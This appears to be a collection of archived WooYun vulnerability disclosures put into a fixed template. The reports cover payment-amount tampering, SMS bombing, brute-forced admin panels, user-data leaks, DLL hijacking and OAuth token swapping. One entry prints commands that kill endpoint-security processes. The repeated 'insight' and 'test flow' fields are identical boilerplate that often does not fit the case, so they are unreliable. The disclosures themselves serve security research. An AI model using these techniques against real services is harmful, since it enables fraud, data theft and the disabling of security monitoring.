**详情**: http://**.**.**.**/back/login.jsp抓包直接爆破管理人员：max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://**.**.**.**Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://**.**.**.**/back/Cjy_load.d

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 继续核查其它弱密码用户......
---

---
### [wooyun-2015-0109037] 蔚蓝团支付逻辑漏洞(可负数支付)
**厂商**: 蔚蓝团 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 蔚蓝团团购网站：https://example.com/[已脱敏]

**POC**: 证明如上～友情测试，请勿发货～

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2015-0103258] 网站安全狗防护规则绕过之三
**厂商**: 安全狗 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 本地测试了网站安全狗APACHE版，安全狗官网下载网站安全狗（APACHE）最新版为V3.1.09924，网马库版本为：2015-02-28

**POC**: 对请求中的header没有任何防护，导致可注入获取敏感数据本地配置一个漏洞环境，是获取客户端ip然后传入SQL查询1.首先加上 and 1=1提示被拦截了2.通过header中的client ip进行注入直接获取管理员账户密码：3.没有任何预警提示

**绕过**: 直接利用

**修复**: 加上对应防护
---

---
### [wooyun-2015-0123579] 桔色成人某处支付逻辑漏洞
**厂商**: 桔色成人 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 。。

**绕过**: 直接利用

**修复**: 数量服务器验证
---

---
### [wooyun-2015-094334] Wacom中国网站存在设计漏洞妈妈再也不用担心我买不起数位板了
**厂商**: wacom.com.cn | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Wacom中国在线支付商城存在支付漏洞https://example.com/[已脱敏]

**POC**: 1、首先我们去Wacom在线商城选几件商品加入购物车，然后我们直接点击减号是不可以减的，我们需要先加一个减号，然后再点击减号，我们发现，已经可以减了于是我就选了几件价格加吧加吧是正数，然后商品数量也为正的2、接下来我们提交~~3、支付，我们看看能不能通过某电商平台4、我们发现是可以支付的啊！PS：其实我已经搭配出来了1块钱购物的组合…但是……但是……但是！邮费30~~~~~我实在是害怕我提交个漏洞，还得倒搭30RMB啊，不对！是31RMB！~。~  也不期待给礼物了，能确认就行~当然要是能给我个 数位板啥的 小弟也不介意的哈

**绕过**: 直接利用

**修复**: 数值验证
---

---
### [wooyun-2015-0121920] 某银行手机客户端存在被中间人攻击的风险
**厂商**: bsb.com.cn | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 对于银行来说，都应该采用https/tls这种安全通信协议，同时要对服务器证书校验。但是该银行客户端包括Android、IOS虽然采用了https，但是没有校验服务器证书，那么在不安全的网络环境中，存在被中间人攻击的可能。首先试试登陆然后可以看到，用fiddler已经把通信给截获了，可以看到返回的明文。更为危险的是，该银行的客户端核心是一个webkit，有些数据返回的是html页面。那么有可能直接被替换掉。比如在自助注册的页面，可以再fiddler中看到这个请求返回的是html。bpu下断点修改一下标题部分，篡改成功。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 在采用https协议的同时，要对服务器证书进行验证。
---

---
### [wooyun-2014-082114] 某电商平台某网站全网号码存在任意登录、短信轰炸、绕过验证码的漏洞
**厂商**: 江苏某电商平台电子商务有限公司 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 正常登录易购，打开我的互联界面，选择登录模式为短信验证码，获取验证码。https://example.com/[已脱敏] /myauth/checkMobile.htm HTTP/1.1Host: 10035.suning.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencode

**POC**: 已经证明

**绕过**: 过滤绕过

**修复**: 1、不将短信验证码显示在http返回值里面2、服务密码这块加入输入错误次数的限制，防止暴力破解3、加密，时间戳，每个包要有包序号，每次同向加1，收到重复序号认为是攻击，可以抵御重放攻击。4、验证更换手机密码步骤之间的关联和有效性。
---

---
### [wooyun-2015-0101635] 珍珠美人网支付漏洞
**厂商**: 珍珠美人网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 选个购买的物品提交订单抓包修改pvnum参数就是钱吧这个参数改成1元这里我就买个3000多的测试下  14万的戒指也可以用1块钱就买了然后来到我的订单界面查看只要1块钱 我就去付款了后面就是支付成功的截图了求礼物啊

**POC**: 选个购买的物品提交订单抓包修改pvnum参数就是钱吧这个参数改成1元这里我就买个3000多的测试下  14万的戒指也可以用1块钱就买了然后来到我的订单界面查看只要1块钱 我就去付款了后面就是支付成功的截图了求礼物啊

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2015-0161616] 三只松鼠某处泄露45万用户信息（附送短信轰炸接口）
**厂商**: 3songshu.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 本次检测的是三只松鼠 app0x001：个人资料的泄露这是我的个人资料 虽然昵称那被遮挡了 但是并不妨碍 我们点击进来的时候抓包为了不泄露我的个人资料 上图是已经修改id后别人的个人资料 如上图 修改http头的 userid 可查看用户的资料0x002:用户收货地址的遍历如 0x001 所示 我们点击收货地址的时候抓包这是我自己的收货地址 我们用 burp 遍历下 userid （这里为了方便 直接遍历 100450000 至 100458625 ） 有些用户没填写 所以为空 但是大部分填写了好几个地址 这里就截图几个0x003：短信轰炸接口POST /mobile/api/global/sendSMSVerifyCode HTTP/1.1Host: mall.3songshu.com:82Connection: keep-aliveContent-Type: application/x

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0145065] 蜘蛛网某处逻辑缺陷可刷积分
**厂商**: 万丰文化 | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、登陆，选择物品，进入购物车提交，点提交订单，fiddler拦截请求2、拦截后，修改points字段，刷多少积分就修改成多少，这里我们刷999积分3、提交之后，我们来看下订单详情，订单已获得999.00积分,成功了。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们懂的
---

---
### [wooyun-2016-0174799] 酷我音乐会员0.01元购买成功存在支付逻辑漏洞
**厂商**: 酷我音乐 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、找到酷我会员购买界面，使用某互联网公司支付方式2、正常情况下需要通过扫描某互联网公司的支付验证码，支付10元购买一个月会员3、0元购买时通过修改数据包的付费金额为0.01元，然后扫描某互联网公司支付成功后就可以成功成为会员了修改为0.01元继续操作支付请求变为0.01元了扫一下支付成功后重新登录查看

**POC**: 1、0.01元购买了酷我会员2、银行扣款0.01元

**绕过**: 直接利用

**修复**: 1、对支付的金额做保护，仅做url编码是不可以的
---

---
### [wooyun-2012-012943] 购易网存在支付漏洞——0.1元购买任意商品
**厂商**: https://example.com/[已脱敏]) | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先随便选择一款商品。修改金额：

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-075054] 74cms 设计缺陷导致全版本验证码绕过（可用于恶意发帖等）
**厂商**: 74c,s.com | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 同dedecms一样！保存session到文件中！文件名用的是sess_+PHPSESSID直接访问即可获知验证码！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: ....
---

---
### [wooyun-2013-036160] 金山毒霸多处DLL文件劫持漏洞续
**厂商**: 金山毒霸 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: WooYun: 金山毒霸多处DLL文件劫持漏洞（可能被用于提权或后门等）厂商修复后二次测试结果。金山毒霸SP4.5最新版（版本2013.sp4.5.090423），官方下载安装版本kavsetup130902_99_50.exe，windows xp sp3环境，病毒库升至最新时间090417，金山毒霸的几个主程序在运行中会加载一些不存在的DLL文件，导致可能被恶意软件利用进入其进程空间胡做非为。具体见下：kxescore.exe进程加载的缺失DLL列表：c:\program files\kingsoft\kingsoft antivirus\kis.dllc:\program files\kingsoft\kingsoft antivirus\kisuisp.dllc:\program files\kingsoft\kingsoft antivirus\ksinst.dllc:\prog

**POC**: 参见WooYun: 金山毒霸多处DLL文件劫持漏洞（可能被用于提权或后门等）这里不重复了。贴个版本的截图。

**绕过**: 直接利用

**修复**: 厂商懂得。
---

---
### [wooyun-2012-07592] 万网发验证信息，无限时。无限次数形成短信轰炸
**厂商**: 万网 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先进入 万网注册地址：https://example.com/[已脱敏] 免费获取短信验证码  。

**POC**: 你们可以自己测试的

**绕过**: 直接利用

**修复**: 修改网站验证程序的源码  将发信时间修改一下
---

---
### [wooyun-2013-017328] 双流机场终端机绕过
**厂商**: 双流机场 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 高频操作，导致程序报错，直接进入系统界面。

**POC**: 1.同时高频点击图中两个位置，程序报错。很多位置都可以，高频翻页或者把界面使劲往边上拖都能报错。2.报错后直接进系统管理界面3.当前以管理员身份登录4.调出屏幕键盘，添加帐号5.anything

**绕过**: 直接利用

**修复**: 1.把开发商拖出去打一顿。2.提高程序容错性3.终端机的系统不定制也该限制一下权限啊
---

---
### [wooyun-2015-0150499] 杭州市电动车定位防盗平台设计逻辑缺陷
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这系统明显是为了防盗用的，系统地址：**.**.**.**/Burp出来admin密码，在12306 TOP100弱口令里面

**POC**: 以超级管理员的身份进入系统总共410名用户可以在地图中查看当前位置除此之外还可以查询历史轨迹，相当精确。可以用来获知此人的生活规律用户不少

**绕过**: 直接利用

**修复**: 改密码改密码改密码重说三，不要辜负人民群众对你们的期望
---

---
### [wooyun-2015-0160332] 问津专家云设计逻辑缺陷可任意账号登陆
**厂商**: 问津网讯 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通过重置登陆密码，实现任意账号登陆重置密码过程中短信验证码在返回数据包中，不用手机就可以看到短信验证码，直接绕过短信验证https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 删除返回数据包中的短信验证码
---

---
### [wooyun-2014-074674] 某电影网站存在支付漏洞
**厂商**: 北京觅影文化发展有限公司 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 主站：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 哎，不敢去取票啊。还是去赶班车吧
---

---
### [wooyun-2013-032574] 上海好孩子网上商城支付漏洞
**厂商**: mamabb.com | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 开始吧,进入官方商城进行购买随便买几个东西吧,恩。。就找奶粉吧https://example.com/[已脱敏]  还真是贵。。我们多选几个吧不然等会不好加减、买多一点送@钱途、、我们先买478点击加入购物车抓包改包如图改为负数- -因为刚刚奶粉被抵消了、、这样的金额太小了不好找比他小2倍商品 我们换一个金额大一些的,买个床送给@钱途吧1000多块。。。我想只要支付就能买吧。。。嘿嘿。。

**POC**: 我是来求礼物的

**绕过**: 直接利用

**修复**: - -专业术语么。。1.像金额这样的信息不要放在页面上，确实有随时被篡改的风险，这些信息本来就在数据库中，可以定义一个字符型的字段代替金额的传输，或者直接由商品唯一标识来查询数据库得到金额；2.签名校验是最重要的了，将购买的商品、数量、金额（或替代字段）、订单的ID号生成一个校验字符串。在每次数据传
---

---
### [wooyun-2014-071524] 某搜索引擎某站存在支付漏洞（支付成功证明）
**厂商**: 某搜索引擎 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某搜索引擎贴吧点击上图的领取超链接选择一个我选择贴吧小妞印记在贴吧收银台这个页面修改元素<div data-amount="3000" data-price="3000" data-id="tbxiaoniu" class="fn-YJ content">将3000修改为比较小的数选择一下数量然后支付支付成功话说这个贴吧印记是什么。。。

**POC**: 某搜索引擎贴吧点击上图的领取超链接选择一个我选择贴吧小妞印记在贴吧收银台这个页面修改元素<div data-amount="3000" data-price="3000" data-id="tbxiaoniu" class="fn-YJ content">将3000修改为比较小的数选择一下数量然后支付支付成功话说这个贴吧印记是什么。。。

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-093829] 中国民航出入境API系统逻辑缺陷导致出入境实时数据泄露
**厂商**: travelsky.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 猜测用户名：admin通过用户名重置口令口令答案直接返回给了浏览器提交时通过Temper Data将提交参数中的email修改成任意邮箱发送成功邮箱中收到了新密码登录成功

**POC**: 出入境相关实时数据在线用户

**绕过**: 直接利用

**修复**: 口令已经给你们重置回api@travelsky.com邮箱里了（以最后的那个为准）。求别查水表……修复方案：密码放在后台验证，另外注意一下帐号密码的强度（admin真的太好猜了……）
---

---
### [wooyun-2015-096743] 某电商平台新年红包单用户可多次刷
**厂商**: 某电商平台 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 数据存在在本地，可以通过删除本地数据再次抢红包

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 数据保存在服务器而不是本地
---

---
### [wooyun-2014-080072] 全国某大型顶级豪华家居商城存在任意金额支付漏洞（1元当100万涉及核心金融业务）
**厂商**: 某大型顶级豪华家居商城 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 美乐乐全国顶级豪华家居商城存在任意金额支付漏洞 # 1元当100万涉及核心金融业务

**POC**: 注册账号后购买商品，如图，我购买了10W的豪华家居~~·之后提交订单，直到最后一步点击支付后抓包价格在post值里，修改为1，再次提交成功1元购买了10W人民币的家居.

**绕过**: 直接利用

**修复**: 修复逻辑
---

---
### [wooyun-2015-0127746] 重庆联通VIP俱乐部IOS客户端暴力破解登录导致客户敏感信息泄露
**厂商**: 联通 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 客户端登录过程，采用手机号码+短信验证码方式；由于短信验证码为4位数字，且有效时长较长，导致可暴力破解验证码登录app客户端进行非法操作。（1）获取客户手机卡信息：vip号、积分等（2）获取客户套餐信息：套餐信息、余额（3）可进行积分兑换等同时，还存在短信验证码短信轰炸问题。

**POC**: 1、输入vip联通号（可遍历）和任意验证码2、数据抓包暴力破解

**绕过**: 直接利用

**修复**: 1、建议增加图形验证码提交进行校验
---

---
### [wooyun-2014-052678] 北信源监控审计系统进程保护设计缺陷，用户态可杀
**厂商**: 北京北信源软件股份有限公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 本来是自己留给卸载程序的关闭后门，但是对调用方没有验证，所以就完蛋啦！北信源有4个进程，Watch开头的用net stop VRVWatchServer就搞定了剩下三个vrv开头的进程，都有各自不可见的窗口，发送两个消息就可以关。三个vrv开头的进程中，有一个进程以一个文件作为进程终止标志，文件被创建则进程自行退出，同时，自我保护又没有限制这个文件的创建者，然后就可以乱搞了……

**POC**: 代码部分逆向得卸载程序，写得很糙，凑合看吧……system("net stop VRVWatchServer")HWND hEdpPolicyWnd = FindWindowW(0,"EDP-POLICY");HWND hEdpProtectedWnd = FindWindowW(0,"EDP_PROTECTED");HWND hEdpMainWnd = FindWindowW(0,"EDP_MAIN");PostMessageW(hEdpPolicyWnd,0xA40,1,0);PostMessageW(hEdpProtectedWnd,0xA40,1,0);PostMessageW(hEd

**绕过**: 直接利用

**修复**: 验证消息发送方是否为卸载程序，保护服务不被关闭。一些调试用的标志不要在Release版里存在。完善保护，用户态还有别的办法可以搞。
---

---
### [wooyun-2013-017543] 金山快盘手机客户端任意进入他人快盘账号
**厂商**: 金山网络 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 金山快盘手机客户端，在使用某社交平台OAuth 2.0授权信息换取自己认证信息的过程中，一次性犯下两类常见的逻辑设计缺陷，导致可以任意进入他人快盘账号；但前提是，快盘帐号需要绑定某社交平台。具体犯下的错误有：（问题一）OAuth 2.0无绑定token问题：由于OAuth 2.0的“无绑定token”特性（https://example.com/[已脱敏] ），导致第三方应用在使用平台方的OAuth 2.0授权（authorize）作为自身应用的认证（authenticate）手段时，缺乏一种有效的认证传递校验和来源检查，从而导致只需要拥有B应用的access token，即可登录到A应用所绑定的服务中。此案例可见：WooYun: 啪啪任意进入他人账号（OAuth 2.0无绑定token问题）（问题二）使用错误的OAuth授权信息来用于认证交换：使用了uid来认证用

**POC**: 问题一证明：OAuth 2.0无绑定token问题，通过拦截某社交平台某社交平台返回的access token信息，修改成他人的access token和某社交平台uid，即可进入他人快盘。请注意，这个access token可以使用其它应用获取到的access token。修改难度中低，因为需要知道受害者在其它应用的access token。此时，一般需要诱骗受害者授权攻击者指定的应用，才可以完成攻击。（某社交平台授权过程中，我使用了某社交平台uid 1780xxx登录；然后在下一步登录成功后截获，并将某社交平台uid 1780xxx在快盘获取的access token“2.00tRjxx”和uid“1780xxx”，替换成新

**绕过**: 直接利用

**修复**: 危害评定：就快盘而言，综合认定为“高”。原因如下：（1）问题一中，要获取用户的access token比较容易，只需要注册第三方应用并诱导用户授权即可。（2）问题二中，要获取用户的某社交平台uid极容易，只需要某社交平台搜索即可获知。（3）定向攻击容易，只需要修改数据包；最终成功率极高，并且只要用户不修改密码，
---

---
### [wooyun-2015-0151108] 易付宝钱包Android客户端接受push消息的组件可被其他程序调用（可向其发送钓鱼等虚假信息）
**厂商**: 江苏某电商平台电子商务有限公司 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 客户端程序接受push消息的receiver组件对外暴露可被其他程序调用，恶意程序可向其发送精心构造的广播消息，消息可为虚假钓鱼信息，欺骗易付宝用户，骗取个人信息等。

**POC**: 1.客户端基本apk  : com.suning.mobile.epa, 42, 4.5.0, 易付宝钱包apkmd5: 0bb3671ecc627e163b84ca2e20171384证书 :certmd5: 7387fb20bd9313403ce7ba6cf7354633issuer: CN=Suningsubject: CN=Suning2.漏洞证明：androidmanifest文件中配置的receiver组件对外暴露：通过客户端反编译得到的java代码分析，该receiver接收到广播后，处理key为message的数据（为push的消息内容信息）：做了一个demo程序，向易付宝钱包

**绕过**: 直接利用

**修复**: 对receive添加android:exported="false"属性
---

---
### [wooyun-2014-083049] 51offer某业务支付逻辑漏洞
**厂商**: 51offer.com | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 51offer.com10元去留洋？问题处在mail.51offer.com的购买环节，刚开始测试时发现修改价格无效。然后测试在提交订单时替换订单号，用1900的订单号替换1700的，成功了，那么就意味着在最后的支付环节订单号和金额没有做验证，这是跳到某电商平台付钱的最后一步。先看看1700的单：跳到某电商平台时修改金额或者订单号随意：然后就上某电商平台付钱，是真的付钱，不过我一毛钱都没，就不留洋了：

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-033674] 金山卫士DLL劫持漏洞系列一
**厂商**: 金山网络 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 官网下载最新版金山卫士(setup_4.6.0.3633.exe)，安装后ksafe.exe版本号为4.6.0.3633，运行环境为win xp sp3，ksafe.exe会加载一个名为kernelbase.dll的模块，该模块为windows vista之后才有的系统DLL，windows xp及2003等旧操作系统没有该模块，导致攻击者可以制造一个假的kernelbase.dll模块放置于金山卫士安装目录或windows系统目录下让金山卫士加载，金山卫士做为一款安全软件，模块进入其进程后可以实现种种危险的操作给用户带来安全隐患。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 厂商懂得
---

---
### [wooyun-2013-033879] 珍品网订单在线支付漏洞
**厂商**: 珍品网 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 此问题是在当你买东西时，先不要立即购买，把物品先添加到购物车，添加时，抓包，修改商品数量为负数，虽然修改后页面会提示错误，还但是成功添加，而且在最后，结算时，此商品的价钱就会变成0，不知道为什么。所以正常购买，抓包，修改数据，是不允许修改的，但是通过购物车后就会存在此问题。我们购买两个物品，第二个通过上面方法，先加入购物车，物品id=2337然后抓包修改数量为负数结算时就会发现物品金额变成0，两个物品就算了一个物品的金额而且订单成功提交

**POC**: 利用上面的方法，我们买两个，一个便宜的，一个贵的，然后可以支付一个便宜的金额就可以买两件物品。订单成功提交最后，我们看看能不能支付哈拉，也可以成功支付金额。这样就可以不用怕很贵的礼品买不起啦!

**绕过**: 直接利用

**修复**: 虽然限制了商品数量不能为负数，但是在最后并没有拒绝提交，还能成功支付。重新限制数量，然后看下逻辑问题。
---

---
### [wooyun-2015-0156691] 微影时代管理后台设计逻辑缺陷(财务/订单/红包等信息泄露)
**厂商**: wepiao.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 火星救援最近好火,我也要上火星种土豆,我要种土豆......... 于是在你们网站买电影票的时候,看了下你们主站没发现什么漏洞,然后google一下 你们公司发现了好几个后台管理地址然后找到这个后台https://example.com/[已脱敏] 没发现有做登录限制,于是乎 爆破一组准备,123,123 爆破完毕 发现几个密码为123456的账号,随便登录几个看看 ,哟权限还不小,还可以赋权限...以下密码均为123456外加一个phpinfo 泄露https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加错误登录次数限制
---

---
### [wooyun-2013-033649] 威锋网多处设计缺陷漏洞小礼包（支付漏洞+用户收货地址泄漏）
**厂商**: weiphone | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 【支付漏洞】https://example.com/[已脱敏]

**POC**: 【支付漏洞】以家庭版永久为例，先提交订单确认并截包，我们可以发现payamount就是我们需要支付的金额，单位是元。我们将其改为0.01，也就是一分钱，提交到了支付平台，1分钱！！下面是支付.......然后就购买成功了【商城用户地址遍历漏洞】在提交订单的时候，有一个这样的请求。地址出现在https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 【支付漏洞】不要直接传输金额，应该是商品ID直接对应金额。【商城用户地址遍历漏洞】严格用户权限...
---

---
### [wooyun-2012-014460] 时代互联主站继续注射
**厂商**: 时代互联 | **年份**: 2012 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 本来呢，想找支付漏洞的，充值1W，改表单成1元，建行付款，成功付款了。返回商家的时候给个提示，说金额不符～，接着，我又来了一次，填金额的点提交之后条到一个地址，看这地址后面的整数，我加了一个邪恶的单引号，接着。。就邪恶了。。。

